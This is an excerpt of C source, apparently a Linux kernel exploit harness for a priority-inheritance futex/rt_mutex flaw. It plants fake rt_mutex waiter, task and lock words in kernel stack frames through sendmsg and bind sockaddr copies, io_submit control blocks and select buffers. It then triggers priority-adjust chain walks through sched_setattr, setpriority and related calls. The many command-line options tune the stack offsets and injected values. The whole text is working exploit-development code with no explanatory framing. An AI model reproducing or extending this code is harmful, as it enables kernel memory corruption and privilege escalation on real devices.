    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &peer_name;
    msg.msg_namelen = peer_len;
    msg.msg_iov = iov;
    msg.msg_iovlen = iov_count;

    for (int i = 0; i < 1024; i++) {
        ssize_t n = sendto(tx, fill, sizeof(fill), MSG_DONTWAIT,
                           (const struct sockaddr *)&peer_name, peer_len);
        if (n > 0) {
            filled += n;
            continue;
        }
    ...
    if (waiter_churn_remember_fd_no_close(tx) != 0 ||
        waiter_churn_remember_fd_no_close(rx) != 0) {
        saved_errno = errno;
        close(tx);
        close(rx);
        errno = saved_errno;
    ...
    printf("[W] post-return sendmsg-dgram-name-block prepared filled=%ld iov=%p buf=%p msg=%p local_len=%u peer_len=%u bind_seq=%u name_shift=%ld name_shape=%s fake_head=0x%016llx fake_task=0x%016llx fake_lock=0x%016llx name_w0=0x%016llx name_w1=0x%016llx name_w2=0x%016llx name_w3=0x%016llx name_w4=0x%016llx name_w5=0x%016llx name_w6=0x%016llx name_w7=0x%016llx name_w8=0x%016llx name_w9=0x%016llx timeout_ms=%ld\n",
           filled, (void *)iov, (void *)buf, (void *)&msg,
           (unsigned int)local_len, (unsigned int)peer_len,
           bind_seq, sendmsg_name_shift, sendmsg_name_shape,
           (unsigned long long)name_head,
           (unsigned long long)name_task,
           (unsigned long long)name_lock,
           (unsigned long long)name_w0,
           (unsigned long long)name_w1,
           (unsigned long long)name_w2,
           (unsigned long long)name_w3,
           (unsigned long long)name_w4,
           (unsigned long long)name_w5,
           (unsigned long long)name_w6,
           (unsigned long long)name_w7,
           (unsigned long long)name_w8,
           (unsigned long long)name_w9,
           timeout_ms);
    fflush(stdout);
    ...
    errno = 0;
    sent = sendmsg(tx, &msg, 0);
    saved_errno = errno;

    asm volatile("" : : "r"(buf), "r"(iov), "r"(&local_name),
                 "r"(&peer_name), "r"(&msg), "r"(sent) : "memory");
...
static int trigger_adjust_pi_self_silent(long tid, int nice,
                                         long *ret_out, int *errno_out)
{
    ...
    if (strcmp(waiter_adjust_pi_policy, "batch") == 0) {
        attr.sched_policy = SCHED_BATCH;
    } else if (strcmp(waiter_adjust_pi_policy, "idle") == 0) {
        attr.sched_policy = SCHED_IDLE;
    } else {
        attr.sched_policy = SCHED_NORMAL;
    }
    if (strcmp(waiter_adjust_pi_syscall, "sched-setattr-keep-policy") == 0) {
        attr.sched_flags |= SCHED_FLAG_KEEP_POLICY;
    }

    errno = 0;
    if (strcmp(waiter_adjust_pi_syscall, "setpriority") == 0) {
        ret = setpriority(PRIO_PROCESS, (id_t)tid, nice);
    } else if (strcmp(waiter_adjust_pi_syscall, "sched-setparam") == 0) {
        ret = syscall(SYS_sched_setparam, tid, &param);
    } else if (strcmp(waiter_adjust_pi_syscall,
                      "sched-setscheduler-batch") == 0) {
        ret = syscall(SYS_sched_setscheduler, tid, SCHED_BATCH, &param);
    } else if (strcmp(waiter_adjust_pi_syscall,
                      "sched-setattr-keep-policy") == 0) {
...
static int waiter_post_return_bind_dgram_name_self_probe(void)
{
    int rx = -1;
    struct sockaddr_un peer_name;
    socklen_t peer_len = 0;
    ...
    uint32_t bind_seq =
        (uint32_t)__atomic_add_fetch(&sendmsg_name_bind_seq, 1,
                                     __ATOMIC_RELAXED);
    long self_tid = __atomic_load_n(&waiter_tid_seen, __ATOMIC_ACQUIRE);
    int self_nice = (int)env_long_or("IONSTACK_PROBE_SELF_ADJUST_NICE", 1);
    long self_ret = -999;
    int self_errno = 0;
    int bret;
    int berr;

    if (prepare_sendmsg_dgram_name(&peer_name, &peer_len,
                                   &name_head, &name_task,
                                   &name_lock, bind_seq) != 0) {
        return -1;
    }
    ...
    errno = 0;
    bret = bind(rx, (const struct sockaddr *)&peer_name, peer_len);
    berr = errno;

    /*
     * Silent self-consume immediately after bind(): do not place any other
     * syscall between the sockaddr usercopy stamp and the scheduling change.
     */
    if (self_tid > 0) {
        (void)trigger_adjust_pi_self_silent(self_tid, self_nice,
                                            &self_ret, &self_errno);
    } else {
        self_ret = -1;
        self_errno = ESRCH;
    ...
    printf("[W] post-return bind-dgram-name-self bind_ret=%d bind_errno=%d self_tid=%ld self_syscall=%s self_policy=%s self_nice=%d self_ret=%ld self_errno=%d bind_seq=%u name_shift=%ld name_shape=%s fake_head=0x%016llx fake_task=0x%016llx fake_lock=0x%016llx name_w0=0x%016llx name_w1=0x%016llx name_w2=0x%016llx name_w3=0x%016llx name_w4=0x%016llx name_w5=0x%016llx name_w6=0x%016llx name_w7=0x%016llx name_w8=0x%016llx name_w9=0x%016llx\n",
           bret, berr, self_tid, waiter_adjust_pi_syscall,
           waiter_adjust_pi_policy, self_nice, self_ret, self_errno,
           bind_seq, sendmsg_name_shift, sendmsg_name_shape,
           (unsigned long long)name_head,
           (unsigned long long)name_task,
           (unsigned long long)name_lock,
...
static int waiter_post_return_bind_raw_self_probe(void)
{
    enum {
        bind_addr_size = 0x80,
    };
    int s = -1;
    uint8_t addr[bind_addr_size];
    uint64_t words[SENDMSG_NAME_FAKE_WAITER_WORDS];
    long self_tid = __atomic_load_n(&waiter_tid_seen, __ATOMIC_ACQUIRE);
    int self_nice = (int)env_long_or("IONSTACK_PROBE_SELF_ADJUST_NICE", 1);
    long self_ret = -999;
    int self_errno = 0;
    ...
    for (int i = 0; i < SENDMSG_NAME_FAKE_WAITER_WORDS; i++) {
        words[i] = sendmsg_name_fake_waiter_word(i);
        memcpy(addr + (i * (int)sizeof(uint64_t)),
    ...
    errno = 0;
    bret = bind(s, (const struct sockaddr *)addr, sizeof(addr));
    berr = errno;

    /*
     * Old Samsung GhostLock bind route: raw 0x80 sockaddr copied into the
     * __sys_bind() stack frame, then immediate same-thread priority update.
     */
    if (self_tid > 0) {
        (void)trigger_adjust_pi_self_silent(self_tid, self_nice,
                                            &self_ret, &self_errno);
    ...
    printf("[W] post-return bind-raw-self bind_ret=%d bind_errno=%d self_tid=%ld self_syscall=%s self_policy=%s self_nice=%d self_ret=%ld self_errno=%d name_shape=%s w0=0x%016llx w1=0x%016llx w2=0x%016llx w3=0x%016llx w4=0x%016llx w5=0x%016llx w6=0x%016llx w7=0x%016llx w8=0x%016llx w9=0x%016llx\n",
           bret, berr, self_tid, waiter_adjust_pi_syscall,
           waiter_adjust_pi_policy, self_nice, self_ret, self_errno,
           sendmsg_name_shape,
...
static int io_submit_word_is_set(size_t index)
{
    return index < IO_SUBMIT_WORD_COUNT &&
           (io_submit_word_set_mask & (1U << index)) != 0;
}

static void apply_io_submit_word_overrides(uint64_t *words, size_t count)
{
    for (size_t i = 0; i < count && i < IO_SUBMIT_WORD_COUNT; i++) {
        if (io_submit_word_is_set(i)) {
            words[i] = io_submit_words[i];
        }
    }
}

static void init_pattern_iocb_words(struct local_iocb *cb)
{
...
static int trigger_adjust_pi_syscall_for_tid(long tid, int nice, long attempt)
{
    ...
    if (strcmp(waiter_adjust_pi_syscall, "sched-setattr-keep-policy") == 0) {
        /*
         * Force the real __sched_setscheduler()->rt_mutex_adjust_pi() caller
         * while preserving the current scheduling class. This is a middle
         * ground between the no-op-ish sched_setparam path and the much
         * noisier class-switching sched_setattr / sched_setscheduler routes.
         */
        attr.sched_flags |= SCHED_FLAG_KEEP_POLICY;
    }
    ...
    printf("[stage] %s(adjust-pi) attempt=%ld/%ld tid=%ld ret=%ld errno=%d duration_us=%ld policy=%u nice=%d\n",
           waiter_adjust_pi_syscall, attempt, waiter_adjust_pi_repeats, tid,
           ret, ret < 0 ? saved_errno : 0, duration_us,
...
static int waiter_post_return_io_submit_usercopy_probe(void)
{
    ...
    cb.aio_offset = 0;
    apply_io_submit_word_overrides(words, sizeof(cb) / sizeof(words[0]));
    ...
    printf("[W] post-return io-submit-usercopy prepared ctx=0x%lx cb=%p cbp=%p words=%zu " IO_SUBMIT_WORDS_FMT " mapped_task=word0 mapped_lock=word1 opcode=0x%x reqprio=%d fd=%d mapped_prio=%d/0x%08x\n",
           ctx, (void *)&cb, (void *)&cbp, sizeof(cb) / sizeof(words[0]),
           IO_SUBMIT_WORDS_ARGS(words),
...
static void waiter_io_submit_loop(void)
{
    ...
    printf("[W] isolated iosubmitloop prepared ctx=0x%lx cb=%p cbp=%p " IO_SUBMIT_WORDS_FMT " opcode=0x%x reqprio=%d fd=%d\n",
     ...
     *
     * Mark the isolated hold active only after the first io_submit returns, so
     * the main thread does not race into the chainwalk before at least one
     * usercopy refresh has happened.
     */
...
static void waiter_io_submit_cow_loop(void)
{
    ...
    apply_io_submit_word_overrides((uint64_t *)&file_cb,
                                   sizeof(file_cb) / sizeof(uint64_t));
    ...
    printf("[W] isolated iosubmitcowloop prepared ctx=0x%lx fd=%d maps=%d " IO_SUBMIT_WORDS_FMT " opcode=0x%x reqprio=%d\n",
           ctx, fd, mapping_count,
           IO_SUBMIT_WORDS_ARGS((uint64_t *)&file_cb),
...
static int waiter_post_return_pipe_read_io_submit_probe(void)
{
    ...
    uint32_t mapped_prio_word =
        (uint32_t)cb.aio_lio_opcode | ((uint32_t)(uint16_t)cb.aio_reqprio << 16);
    printf("[W] post-return pipe-read-io-submit prepared ctx=0x%lx read_fd=%d write_fd=%d cb=%p cbp=%p " IO_SUBMIT_WORDS_FMT " mapped_task=word0 mapped_lock=word1 mapped_prio=%d/0x%08x expected_pipe_read_entry_sp=0x3d50 expected_wait_entry=0x3cc0 expected_tree_parent_self=0x3cd8\n",
...
static int run_waiter_post_return_probe_once(void)
{
    ...
    if (waiter_post_return_mode_is("sendmsg-dgram-name-block")) {
        return waiter_post_return_sendmsg_dgram_name_block_probe();
    }

    if (waiter_post_return_mode_is("bind-dgram-name-self")) {
        return waiter_post_return_bind_dgram_name_self_probe();
    }

    if (waiter_post_return_mode_is("bind-raw-self")) {
        return waiter_post_return_bind_raw_self_probe();
    }
...
static void print_env(void)
{
    ...
    print_selinux();
    printf("[config] waiter_timeout_ms=%ld waiter_hold_ms=%ld idle_ms=%ld post_exit_delay_ms=%ld pre_chainwalk_delay_ms=%ld pre_chainwalk_delay_us=%ld watchdog_sec=%ld waiter_churn=%s quiet_waiter_churn=%d stackshape_case=%s frameprobe_case=%s frameprobe_select_shift=%ld frameprobe_select_shape=%s sendmsg_name_shift=%ld sendmsg_name_shape=%s fake_waiter_head_mode=%s main_final_shape=%s quiet_final=%d cycle_futex_mode=%s cycle_futex_offset=0x%lx cycle_futex_fixed_addr=0x%016llx regspray_value=0x%016llx stacktag_value=0x%016llx waiter_post_return=%s waiter_isolated_hold=%s waiter_adjust_pi_after_post_return=%d waiter_adjust_pi_after_churn=%d waiter_adjust_pi_syscall=%s waiter_adjust_pi_policy=%s map_fixed_fake_lock=%d reuse_fixed_fake_lock_vma=%d fixed_fake_lock_addr=0x%016llx churn_iterations=%ld churn_keep_fds=%ld process_vm_mb=%ld churn_progress=%s chainwalk_after_churn=%d chainwalk_at_churn_iter=%ld chainwalk_raw_final=%d chainwalk_raw_timeout_ms=%ld chainwalk_raw_val3=0x%016llx stack_marker_telemetry=%ld\n",
           ...
           frameprobe_select_shift, frameprobe_select_shape,
           sendmsg_name_shift, sendmsg_name_shape, fake_waiter_head_mode,
           ...
           waiter_adjust_pi_after_post_return, waiter_adjust_pi_after_churn,
           waiter_adjust_pi_syscall,
           waiter_adjust_pi_policy,
...
static int trigger_waiter_adjust_pi_for_phase(int after_churn)
{
    if (!waiter_adjust_pi_after_post_return) {
        return 0;
    }
    if (waiter_adjust_pi_after_churn && !after_churn) {
        return 0;
    }
    if (!waiter_adjust_pi_after_churn && after_churn) {
        return 0;
    }
    return trigger_waiter_adjust_pi_if_requested();
}
...
static void *waiter_thread(void *unused)
{
    ...
    if (waiter_post_return_isolated()) {
        ...
        if (__atomic_load_n(&waiter_exit_chainwalk_mode, __ATOMIC_ACQUIRE)) {
            if (waiter_adjust_pi_after_post_return) {
                printf("[W] waiter-exit-control: stamped post-return state; waiting for finish signal before exit\n");
                fflush(stdout);
                while (!__atomic_load_n(&finish_waiter, __ATOMIC_ACQUIRE)) {
                    cpu_relax_user();
                }
        ...
        if (waiter_isolated_hold_mode_is_block_probe()) {
            ...
            } else if (waiter_isolated_hold_mode_is("select320")) {
                ret = waiter_post_return_select320_block_probe(0);
            } else if (waiter_isolated_hold_mode_is("pselect320")) {
                ret = waiter_post_return_select320_block_probe(1);
            ...
            } else if (waiter_isolated_hold_mode_is("sendmsg-dgram-name-block")) {
                ret = waiter_post_return_sendmsg_dgram_name_block_probe();
...
static int run_stage_edeadlk_idle(void)
{
    ...
    if (strcmp(waiter_churn_mode, "none") != 0 &&
        waiter_churn_iterations > 0) {
        if (wait_flag_eq("waiter_churn_done", &waiter_churn_done, 1, 5000) != 0) {
            printf("[stage] idle-control: waiter churn did not finish before scan window\n");
        }
    }
    if (maybe_run_idle_stack_scan() != 0) {
        printf("[stage] idle-control: idle stack scan reported failure\n");
    }
    if (trigger_waiter_adjust_pi_for_phase(0) != 0) {
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
...
static int run_stage_waiter_exit_chainwalk(void)
{
    ...
    /*
     * The waiter-exit route originally skipped the post-return adjust-pi
     * trigger entirely, which made it very crash-safe but also let the owner
     * unwind before main touched the PI chain on some layouts. Reuse the same
     * opt-in flag here so we can test "stamp -> adjust_prio -> join waiter ->
     * main chainwalk" without keeping W parked in the isolated-hold loop.
     */
    if (trigger_waiter_adjust_pi_for_phase(0) != 0) {
        __atomic_store_n(&finish_waiter, 1, __ATOMIC_RELEASE);
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
    ...
    if (trigger_waiter_adjust_pi_for_phase(1) != 0) {
        __atomic_store_n(&probe_done, 1, __ATOMIC_RELEASE);
        return 1;
    }
...
static int parse_io_submit_word_arg(const char *arg)
{
    static const char prefix[] = "--io-submit-word";
    ...
    if (arg[len] < '0' || arg[len] > '9' || arg[len + 1] != '=') {
        fprintf(stderr, "invalid io-submit word argument: %s\n", arg);
        exit(2);
    }

    index = (unsigned long)(arg[len] - '0');
    if (index >= IO_SUBMIT_WORD_COUNT) {
        fprintf(stderr, "io-submit word index out of range: %s\n", arg);
        exit(2);
    }

    errno = 0;
    value = strtoull(arg + len + 2, &end, 0);
    if (errno != 0 || end == arg + len + 2 || *end != '\0') {
        fprintf(stderr, "invalid io-submit word value: %s\n", arg);
        exit(2);
    }

    io_submit_words[index] = (uint64_t)value;
    io_submit_word_set_mask |= 1U << index;
    return 1;
}
...
static void usage(const char *argv0)
{
    fprintf(stderr,
            ...
            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmsg-dgram-name-block|bind-dgram-name-self|bind-raw-self|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
            "[--waiter-isolated-hold=busy|getpidloop|getuidloop|iosubmitloop|iosubmitcowloop|usleep|futexwaittag|readv-block-small|readv-block-large|select320|pselect320|epoll-block|sendmsg-block|sendmmsg-block|sendmsg-dgram-name-block|sendmmsg-name-block|sigsuspend-block|seccompgetppid|seccompgetppidlog|seccompgetppidallowmark] "
            "[--waiter-adjust-pi-after-post-return] [--adjust-pi-after-churn] [--adjust-pi-start-isolated-hold] "
            "[--waiter-adjust-pi-syscall=sched-setattr|sched-setattr-keep-policy|sched-setparam|sched-setscheduler-batch|setpriority] "
            "[--waiter-adjust-pi-policy=normal|batch|idle] "
            ...
            "[--frameprobe-case=readlink|clock|nanosleep|futexwake|futexwait|futexwait-args|futexwait-bitset-args|read|write|readv|writev|ioctl-fionread|sendmsg|recvmsg|sendmsg-block|select320|pselect320|ppoll|prctl-name] "
            "[--frameprobe-select-shift=N] [--frameprobe-select-shape=tag|fake-waiter] "
            "[--frameprobe-futex-uaddr-shift=N] [--frameprobe-futex-timeout-shift=N] [--frameprobe-futex-uaddr2-shift=N] "
            "[--frameprobe-futex-val3=U64] [--frameprobe-futex-uaddr-word=U32] [--frameprobe-futex-uaddr2-word=U32] "
            "[--frameprobe-ppoll-shift=N] [--frameprobe-ppoll-nfds=N] [--frameprobe-ppoll-shape=default|tag|fake-waiter] "
            "[--sendmsg-name-shift=N] [--sendmsg-name-shape=plain|fake-waiter] "
            "[--fake-waiter-head-mode=default|fake-w0|zero|root-black] "
            "[--regspray-value=U64] [--stacktag-value=U64] "
            "[--io-submit-wordN=U64 (N=0..7)] "
            ...
            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmsg-dgram-name-block|bind-dgram-name-self|bind-raw-self|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
            "[--waiter-isolated-hold=busy|getpidloop|getuidloop|iosubmitloop|iosubmitcowloop|usleep|futexwaittag|readv-block-small|readv-block-large|select320|pselect320|epoll-block|sendmsg-block|sendmmsg-block|sendmsg-dgram-name-block|sendmmsg-name-block|sigsuspend-block|seccompgetppid|seccompgetppidlog|seccompgetppidallowmark] "
            "[--waiter-adjust-pi-after-post-return] [--adjust-pi-after-churn] "
            "[--waiter-adjust-pi-syscall=sched-setattr|sched-setattr-keep-policy|sched-setparam|sched-setscheduler-batch|setpriority] "
            "[--waiter-adjust-pi-policy=normal|batch|idle] "
            "[--map-fixed-fake-lock] [--reuse-fixed-fake-lock-vma] "
            "[--fixed-fake-lock-addr=U64] "
...
int main(int argc, char **argv)
{
    if (argc >= 3 &&
        ...
        for (int i = 3; i < argc; i++) {
            ...
            if (strncmp(argv[i], "--adjust-pi-syscall=", strlen("--adjust-pi-syscall=")) == 0) {
                waiter_adjust_pi_syscall =
                    argv[i] + strlen("--adjust-pi-syscall=");
                continue;
            }
            if (strncmp(argv[i], "--adjust-pi-policy=", strlen("--adjust-pi-policy=")) == 0) {
                waiter_adjust_pi_policy =
                    argv[i] + strlen("--adjust-pi-policy=");
                continue;
            }
            ...
            if (parse_long_arg(argv[i], "--frameprobe-select-shift=",
                               &frameprobe_select_shift)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--frameprobe-futex-uaddr-shift=",
                               &frameprobe_futex_uaddr_shift)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--frameprobe-futex-timeout-shift=",
                               &frameprobe_futex_timeout_shift)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--frameprobe-futex-uaddr2-shift=",
                               &frameprobe_futex_uaddr2_shift)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--frameprobe-ppoll-shift=",
                               &frameprobe_ppoll_shift)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--frameprobe-ppoll-nfds=",
                               &frameprobe_ppoll_nfds)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--sendmsg-name-shift=",
                               &sendmsg_name_shift)) {
                continue;
            }
            ...
            if (parse_u64_arg(argv[i], "--frameprobe-select-head=",
                              &frameprobe_select_head_override)) {
                frameprobe_select_head_override_set = 1;
                continue;
            }
            if (parse_io_submit_word_arg(argv[i])) {
                continue;
            }
            if (parse_u64_arg(argv[i], "--io-submit-task=", &io_submit_words[0])) {
                io_submit_word_set_mask |= 1U << 0;
                continue;
            }
            if (parse_u64_arg(argv[i], "--io-submit-lock=", &io_submit_words[1])) {
                io_submit_word_set_mask |= 1U << 1;
                continue;
            }
            ...
            if (parse_u64_arg(argv[i], "--frameprobe-futex-val3=", &value_u64)) {
                frameprobe_futex_val3 = value_u64;
                frameprobe_futex_val3_set = 1;
                continue;
            }
            if (parse_u64_arg(argv[i], "--frameprobe-futex-uaddr-word=", &value_u64)) {
                if (value_u64 > UINT32_MAX) {
                    fprintf(stderr,
                            "frameprobe futex uaddr word out of uint32 range: %s\n",
                            argv[i]);
                    return 2;
                }
                frameprobe_futex_uaddr_word = (uint32_t)value_u64;
                continue;
            }
            if (parse_u64_arg(argv[i], "--frameprobe-futex-uaddr2-word=", &value_u64)) {
                if (value_u64 > UINT32_MAX) {
                    fprintf(stderr,
                            "frameprobe futex uaddr2 word out of uint32 range: %s\n",
                            argv[i]);
                    return 2;
                }
                frameprobe_futex_uaddr2_word = (uint32_t)value_u64;
                continue;
            }
            ...
            if (strncmp(argv[i], "--frameprobe-select-shape=",
                        strlen("--frameprobe-select-shape=")) == 0) {
                frameprobe_select_shape =
                    argv[i] + strlen("--frameprobe-select-shape=");
                continue;
            }
            if (strncmp(argv[i], "--frameprobe-ppoll-shape=",
                        strlen("--frameprobe-ppoll-shape=")) == 0) {
                frameprobe_ppoll_shape =
                    argv[i] + strlen("--frameprobe-ppoll-shape=");
                continue;
            }
            if (strncmp(argv[i], "--sendmsg-name-shape=",
                        strlen("--sendmsg-name-shape=")) == 0) {
                sendmsg_name_shape =
                    argv[i] + strlen("--sendmsg-name-shape=");
                continue;
            }
            if (strncmp(argv[i], "--fake-waiter-head-mode=",
                        strlen("--fake-waiter-head-mode=")) == 0) {
                fake_waiter_head_mode =
                    argv[i] + strlen("--fake-waiter-head-mode=");
                continue;
            }
            ...
            if (strcmp(argv[i], "--adjust-pi-after-churn") == 0) {
                waiter_adjust_pi_after_churn = 1;
                continue;
            }
        ...
        if (waiter_timeout_ms < 100 ||
            ...
            frameprobe_futex_uaddr_shift > 65536 ||
            frameprobe_futex_timeout_shift > 65536 ||
            frameprobe_futex_uaddr2_shift > 65536 ||
            frameprobe_ppoll_shift > 65536 ||
            frameprobe_ppoll_nfds > FRAMEPROBE_PPOLL_STACK_NFDS ||
        ...
        if (strcmp(waiter_adjust_pi_syscall, "sched-setattr") != 0 &&
            strcmp(waiter_adjust_pi_syscall,
                   "sched-setattr-keep-policy") != 0 &&
            strcmp(waiter_adjust_pi_syscall, "setpriority") != 0 &&
            strcmp(waiter_adjust_pi_syscall, "sched-setparam") != 0 &&
            strcmp(waiter_adjust_pi_syscall,
                   "sched-setscheduler-batch") != 0) {
            fprintf(stderr, "invalid adjust-pi syscall: %s\n",
                    waiter_adjust_pi_syscall);
            return 2;
        }
        if (strcmp(waiter_adjust_pi_policy, "batch") != 0 &&
            strcmp(waiter_adjust_pi_policy, "idle") != 0 &&
            strcmp(waiter_adjust_pi_policy, "normal") != 0) {
            fprintf(stderr, "invalid adjust-pi policy: %s\n",
                    waiter_adjust_pi_policy);
            return 2;
        }
        ...
        if (!frameprobe_select_shape_valid()) {
            fprintf(stderr, "invalid frameprobe select shape: %s\n",
                    frameprobe_select_shape);
            return 2;
        }
        if (!frameprobe_ppoll_shape_valid()) {
            fprintf(stderr, "invalid frameprobe ppoll shape: %s\n",
                    frameprobe_ppoll_shape);
            return 2;
        }
        if (!sendmsg_name_shape_valid()) {
            fprintf(stderr, "invalid sendmsg name shape: %s\n",
                    sendmsg_name_shape);
            return 2;
        }
        if (!fake_waiter_head_mode_valid()) {
            fprintf(stderr, "invalid fake waiter head mode: %s\n",
                    fake_waiter_head_mode);
            return 2;
        }
        ...
        if ((frameprobe_select_shift >= 0 ||
             !frameprobe_select_shape_is("tag")) &&
            !((waiter_churn_mode_is("frameprobe") &&
               frameprobe_case_is_select320()) ||
              waiter_isolated_hold_mode_is_select320())) {
            fprintf(stderr,
                    "frameprobe select options require frameprobe select320/pselect320 or waiter-isolated-hold=select320/pselect320\n");
            return 2;
        }
        if (!frameprobe_select_shape_is("tag") &&
            frameprobe_select_shift < 0) {
            fprintf(stderr,
                    "frameprobe select shape requires --frameprobe-select-shift=N\n");
            return 2;
        }
        if (frameprobe_select_shift >= 0) {
            long word_count = frameprobe_select_shape_is("fake-waiter") ?
                              FRAMEPROBE_SELECT_FAKE_WAITER_WORDS : 4;
            if (frameprobe_select_shift + word_count >
                FRAMEPROBE_SELECT_USER_KERNEL_WORDS) {
                fprintf(stderr,
                        "frameprobe select shift exceeds controlled words: shift=%ld words=%ld max=%d\n",
                        frameprobe_select_shift, word_count,
                        FRAMEPROBE_SELECT_USER_KERNEL_WORDS);
                return 2;
            }
        }
        if (frameprobe_ppoll_nfds < 1) {
            fprintf(stderr, "frameprobe ppoll nfds must be >= 1\n");
            return 2;
        }
        if ((frameprobe_ppoll_shift != 0 ||
             frameprobe_ppoll_nfds != 1 ||
             !frameprobe_ppoll_shape_is("default")) &&
            !frameprobe_case_is_ppoll()) {
            fprintf(stderr,
                    "frameprobe ppoll options require --frameprobe-case=ppoll\n");
            return 2;
        }
        if ((frameprobe_futex_uaddr_shift != 0 ||
             frameprobe_futex_timeout_shift != 0x40 ||
             frameprobe_futex_uaddr2_shift != 0x80 ||
             frameprobe_futex_val3_set ||
             frameprobe_futex_uaddr_word != 0 ||
             frameprobe_futex_uaddr2_word != 0x43495645U) &&
            !(frameprobe_case_is("futexwait-args") ||
              frameprobe_case_is("futexwait-bitset-args"))) {
            fprintf(stderr,
                    "frameprobe futex options require --frameprobe-case=futexwait-args\n");
            return 2;
        }
        if (frameprobe_case_is("futexwait-args") ||
            frameprobe_case_is("futexwait-bitset-args")) {
            size_t slotsearch_max_len =
                SLOTSEARCH_PAGES * SLOTSEARCH_PAGE_SIZE;
            if (frameprobe_futex_uaddr_shift < 0 ||
                frameprobe_futex_timeout_shift < 0 ||
                frameprobe_futex_uaddr2_shift < 0) {
                fprintf(stderr,
                        "frameprobe futex shifts must be >= 0\n");
                return 2;
            }
            if ((size_t)frameprobe_futex_uaddr_shift + sizeof(uint32_t) >
                    slotsearch_max_len ||
                (size_t)frameprobe_futex_timeout_shift + sizeof(struct timespec) >
                    slotsearch_max_len ||
                (size_t)frameprobe_futex_uaddr2_shift + sizeof(uint32_t) >
                    slotsearch_max_len) {
                fprintf(stderr,
                        "frameprobe futex shifts exceed slotsearch region\n");
                return 2;
            }
        }
        if (sendmsg_name_shift < 1) {
            fprintf(stderr,
                    "sendmsg name shift must be >= 1 to keep abstract namespace prefix intact\n");
            return 2;
        }
        if (((size_t)sendmsg_name_shift * sizeof(uint64_t)) +
                (SENDMSG_NAME_FAKE_WAITER_WORDS * sizeof(uint64_t)) >
            sizeof(struct sockaddr_un)) {
            fprintf(stderr,
                    "sendmsg name shift exceeds sockaddr_un capacity: shift=%ld words=%d size=%zu\n",
                    sendmsg_name_shift, SENDMSG_NAME_FAKE_WAITER_WORDS,
                    sizeof(struct sockaddr_un));
            return 2;
        }
        ...
        if ((sendmsg_name_shift != 1 || !sendmsg_name_shape_is("plain")) &&
            !waiter_post_return_mode_is("sendmsg-dgram-name-block") &&
            !waiter_post_return_mode_is("bind-dgram-name-self") &&
            !waiter_post_return_mode_is("bind-raw-self") &&
            !waiter_isolated_hold_mode_is("sendmsg-dgram-name-block")) {
            fprintf(stderr,
                    "sendmsg name options require waiter-post-return=sendmsg-dgram-name-block|bind-dgram-name-self|bind-raw-self or waiter-isolated-hold=sendmsg-dgram-name-block\n");
            return 2;
        }
        if (waiter_isolated_hold_mode_is("seccompgetppid") &&
            !waiter_post_return_mode_is("seccomperrno") &&
